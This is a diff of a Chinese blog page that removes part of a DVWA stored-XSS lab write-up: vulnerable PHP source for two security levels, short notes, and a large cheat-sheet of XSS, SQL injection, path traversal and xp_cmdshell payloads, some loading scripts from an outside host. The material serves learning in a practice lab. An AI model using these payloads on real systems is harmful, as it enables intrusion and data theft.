-<h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>message那一块儿没有变动，<br>name那一块儿针对script做了限制。改用img。<br><img src="/img/xss-4.png" alt="xss-4"><br>攻击成功。</p>
-<h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; );</span><br><span class="line">    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>加了Anti-CSRF token、改动了更新数据库的部分，这些不太懂。<br>主要是name和message的安全等级一样了，这和反射型xss攻击的impossible原理是近乎一致的。</p>
-<hr>
-<p>测试代码大全</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">=&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line">%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E</span><br><span class="line">&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp</span><br><span class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line">%3f.jsp</span><br><span class="line">%3f.jsp</span><br><span class="line">&lt;script&gt;alert(&apos;Vulnerable&apos;);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">?sql_debug=1</span><br><span class="line">a%5c.aspx</span><br><span class="line">a.jsp/&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">a/</span><br><span class="line">a?&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">&apos;;exec%20master..xp_cmdshell%20&apos;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&apos;--&amp;&amp;</span><br><span class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line">1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=</span><br><span class="line">http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd</span><br><span class="line">..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">\..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=JaVaScRiPt:alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&quot;&lt;IMG src=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</span><br><span class="line">&lt;IMG src=&quot; javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;BGSOUND src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;br size=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;</span><br><span class="line">&lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</span><br><span class="line">&lt;IMG src=&quot;mocha:[code]&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;livescript:[code]&quot;&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IFRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;behaviour: url(&apos;http://www.how-to-hack.org/exploit.html&apos;);&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;</span><br><span class="line">&lt;IMG STYLE=&apos;xss:expre\ssion(alert(&quot;XSS&quot;))&apos;&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</span><br><span class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;BASE href=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</span><br><span class="line">getURL(&quot;javascript:alert(&apos;XSS&apos;)&quot;)</span><br><span class="line">a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&apos;XSS&apos;);&quot;;eval(a+b+c+d);</span><br><span class="line">&lt;XML src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&apos;XSS&apos;);&#125;&lt;/SCRIPT&gt;&lt;&quot;</span><br><span class="line">&lt;SCRIPT src=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;)&quot;</span><br><span class="line">&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;</span><br><span class="line">&lt;IMG src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br><span class="line">admin&apos;--</span><br><span class="line">&apos; or 0=0 --</span><br><span class="line">&quot; or 0=0 --</span><br><span class="line">or 0=0 --</span><br><span class="line">&apos; or 0=0 #</span><br><span class="line">&quot; or 0=0 #</span><br><span class="line">or 0=0 #</span><br><span class="line">&apos; or &apos;x&apos;=&apos;x</span><br><span class="line">&quot; or &quot;x&quot;=&quot;x</span><br><span class="line">&apos;) or (&apos;x&apos;=&apos;x</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&quot; or 1=1--</span><br><span class="line">or 1=1--</span><br><span class="line">&apos; or a=a--</span><br><span class="line">&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">&apos;) or (&apos;a&apos;=&apos;a</span><br><span class="line">&quot;) or (&quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or 1=1 --</span><br><span class="line">hi&apos; or 1=1 --</span><br><span class="line">hi&apos; or &apos;a&apos;=&apos;a</span><br><span class="line">hi&apos;) or (&apos;a&apos;=&apos;a</span><br><span class="line">hi&quot;) or (&quot;a&quot;=&quot;a[/code]</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/unln1999.github.io/2019/10/07/DVWAXSS/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/unln1999.github.io/page/2/">2</a><a class="page-number" href="/unln1999.github.io/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/unln1999.github.io/page/5/">5</a><a class="extend next" rel="next" href="/unln1999.github.io/page/2/">Next &raquo;</a>
@@ -1225,15 +1242,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">php</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">网站</a>
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1241,7 +1254,19 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">网站</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">bugku</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">buuctf</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1249,15 +1274,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">复变</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">模电</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+                <a href="javascript:void(0)" class="js-tag color3">复变</a>
               </li>
             
             <div class="clearfix"></div>
